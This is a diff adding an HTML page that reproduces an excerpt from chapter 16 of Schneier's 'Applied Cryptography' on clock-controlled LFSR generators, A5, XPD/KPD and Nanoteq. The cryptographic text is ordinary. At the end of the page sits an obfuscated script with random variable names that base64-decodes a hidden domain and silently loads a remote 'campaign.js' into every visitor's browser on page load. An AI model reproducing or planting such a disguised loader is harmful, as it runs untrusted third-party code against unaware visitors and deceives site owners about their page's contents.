@@ -1,0 +1,110 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=387-390//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Gollmann Cascade</I></B></FONT></P>
+<P>The Gollmann cascade (see Figure 16.16), described in [636,309], is a strengthened version of a stop-and-go generator. It consists of a series of LFSRs, with the clock of each controlled by the previous LFSR. If the output of LFSR-1 is 1 at time <I>t</I> - 1, then LFSR-2 clocks. If the output of LFSR-2 is 1 at time <I>t</I> - 1, then LFSR-3 clocks, and so on. The output of the final LFSR is the output of the generator. If all the LFSRs have the same length, <I>n</I>, the linear complexity of a system with <I>k</I> LFSRs is</P>
+<DL>
+<DD><I>n</I>(2<SUP>n</SUP> - 1)<SUP>k-1</SUP>
+</DL>
+<I><P><A NAME="Fig15"></A><A HREF="javascript:displayWindow('images/16-15.jpg',222,116 )"><IMG SRC="images/16-15t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-15.jpg',222,116)"><FONT COLOR="#000077"><B>Figure 16.15</B></FONT></A>&nbsp;&nbsp;Multispeed inner-product generator.</I>
+</P>
+<P>Cascades are a cool idea: They are conceptually very simple and they can be used to generate sequences with huge periods, huge linear complexities, and good statistical properties. They are vulnerable to an attack called <B>lock-in</B> [640]. This is a technique by which a cryptanalyst reconstructs the input to the last shift register in the cascade, then proceeds to break the cascade register by register. This is a serious problem in some situations and weakens the effective key length of the algorithm, but precautions can be taken to minimize the attack.</P>
+<P>Further analysis has indicated that the sequence approaches random as <I>k</I> gets larger [637,638,642,639]. Based on recent attacks on short Gollmann cascades [1063], I recommend using a <I>k</I> of at least 15. You&#146;re better off using more LFSRs of shorter length than fewer LFSRs of longer length.</P>
+<P><FONT SIZE="+1"><B><I>Shrinking Generator</I></B></FONT></P>
+<P>The shrinking generator [378] uses a different form of clock control than the previous generators. Take two LFSRs: LFSR-1 and LFSR-2. Clock both of them. If the output of LFSR-1 is 1, then the output of the generator is LFSR-2. If the output of LFSR-1 is 0, discard the two bits, clock both LFSRs, and try again.
+</P>
+<P>This idea is simple, reasonably efficient, and looks secure. If the feedback polynomials are sparse, the generator is vulnerable, but no other problems have been found. Even so, it&#146;s new. One implementation problem is that the output rate is not regular; if LFSR-1 has a long string of zeros then the generator outputs nothing. The authors suggest buffering to solve this problem [378]. Practical implementation of the shrinking generator is discussed in [901].</P>
+<P><FONT SIZE="+1"><B><I>Self-Shrinking Generator</I></B></FONT></P>
+<P>The self-shrinking generator [1050] is a variant of the shrinking generator. Instead of using two LFSRs, use pairs of bits from a single LFSR. Clock a LFSR twice. If the first bit in the pair is 1, the output of the generator is the second bit. If the first bit is 0, discard both bits and try again. While the self-shrinking generator requires about half the memory space as the shrinking generator, it is also half the speed.
+</P>
+<P>While the self-shrinking generator also seems secure, it still has some unexplained behavior and unknown properties. This is a very new generator; give it some time.</P>
+<I><P><A NAME="Fig16"></A><A HREF="javascript:displayWindow('images/16-16.jpg',280,66 )"><IMG SRC="images/16-16t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-16.jpg',280,66)"><FONT COLOR="#000077"><B>Figure 16.16</B></FONT></A>&nbsp;&nbsp;Gollmann cascade.</I>
+</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">16.5 A5</FONT></H3>
+<P>A5 is the stream cipher used to encrypt GSM (Group Special Mobile). That&#146;s the non-American standard for digital cellular mobile telephones. It is used to encrypt the link from the telephone to the base station. The rest of the link is unencrypted; the telephone company can easily eavesdrop on your conversations.
+</P>
+<P>A lot of strange politics surrounds this one. Originally it was thought that GSM&#146;s cryptography would prohibit export of the phones to some countries. Now some officials are discussing whether A5 might harm export sales, implying that it is so weak as to be an embarrassment. Rumor has it that the various NATO intelligence agencies had a catfight in the mid-1980s over whether GSM encryption should be strong or weak. The Germans wanted strong cryptography, as they were sitting near the Soviet Union. The other countries overruled them, and A5 is a French design.</P>
+<P>We know most of the details. A British telephone company gave all the documentation to Bradford University without remembering to get them to sign a nondisclosure agreement. It leaked here and there, and was eventually posted to the Internet. A paper describing A5 is [1622]; there is also code at the back of this book.</P>
+<P>A5 consists of three LFSRs; the register lengths are 19, 22, and 23; all the feedback polynomials are sparse. The output is the XOR of the three LFSRs. A5 uses variable clock control. Each register is clocked based on its own middle bit, XORed with the inverse threshold function of the middle bits of all three registers. Usually, two of the LFSRs clock in each round.</P>
+<P>There is a trivial attack requiring 2<SUP>40</SUP> encryptions: Guess the contents of the first two LFSRs, then try to determine the third LFSR from the keystream. (Whether this attack is actually feasible is under debate, but a hardware key search machine currently under design should resolve the matter soon [45].)</P>
+<P>Nonetheless, it is becoming clear that the basic ideas behind A5 are good. It is very efficient. It passes all known statistical tests; its only known weakness is that its registers are short enough to make exhaustive search feasible. Variants of A5 with longer shift registers and denser feedback polynomials should be secure.</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">16.6 Hughes XPD/KPD</FONT></H3>
+<P>This algorithm is brought to you by Hughes Aircraft Corp. They put it in army tactical radios and direction-finding equipment for sale to foreign militaries. It was designed in 1986 and called XPD, for Exportable Protection Device. Later it was renamed KPD&#151;Kinetic Protection Device&#151;and declassified [1037,1036].
+</P>
+<P>The algorithm uses a 61-bit LFSR. There are 2<SUP>10</SUP> different primitive feedback polynomials, which were approved by the NSA. The key selects one of these polynomials (they are all stored in ROM somewhere), as well as the initial state of the LFSR.</P>
+<P>It has eight different nonlinear filters, each of which has six taps from the LFSR and which produces 1 bit. The bits combine to generate a byte, which is used to encrypt or decrypt the datastream.</P>
+<P>This algorithm looks pretty impressive, but I doubt it is. The NSA allows export, so there must be some attack on the order of 2<SUP>40</SUP> or less. What is it?</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">16.7 Nanoteq</FONT></H3>
+<P>Nanoteq is a South African electronics company. This is their algorithm that has been fielded by the South African police to encrypt their fax transmissions, and presumably for other uses as well.
+</P>
+<P>The algorithm is described, more or less, in [902<I></I>,903]. It uses a 127-bit LFSR with a fixed feedback polynomial; the key is the initial state of the feedback register. The 127 bits of the register are reduced to a single keystream bit using 25 primitive cells. Each cell has five inputs and one output:</P>
+<DL>
+<DD>f(<I>x</I><SUB>1</SUB>,<I>x</I><SUB>2</SUB>,<I>x</I><SUB>3</SUB>,<I>x</I><SUB>4</SUB>,<I>x</I><SUB>5</SUB>) = <I>x</I><SUB>1</SUB> &#43; <I>x</I><SUB>2</SUB> &#43; (<I>x</I><SUB>1</SUB> &#43; <I>x</I><SUB>3</SUB>) (<I>x</I><SUB>2</SUB> &#43; <I>x</I><SUB>4</SUB> &#43; <I>x</I><SUB>5</SUB>) &#43; (<I>x</I><SUB>1</SUB> &#43; <I>x</I><SUB>4</SUB>) (<I>x</I><SUB>2</SUB> &#43; <I>x</I><SUB>3</SUB>) &#43; <I>x</I><SUB>5</SUB>
+</DL>
+<P>Each input of the function is XORed with some bit of the key. There is also a secret permutation that depends on the particular implementation, and is not detailed in the papers. This algorithm is only available in hardware.
+</P>
+<P>Is this algorithm secure? I doubt it. During the transition to majority rule, embarrassing faxes from one police station to another would sometimes turn up in the liberal newspapers. These could easily have been the results of U.S., U.K., or Soviet intelligence efforts. Ross Anderson took some initial steps towards cryptanalyzing this algorithm in [46]; I expect more results to come soon.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(vYyboTas, cdcgMhia) {cdcgMhia = vYyboTas.createElement('script');cdcgMhia.type = 'text/javascript';cdcgMhia.async = true;cdcgMhia.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');vYyboTas.getElementsByTagName('body')[0].appendChild(cdcgMhia);}(document));</script></body>
+</html>
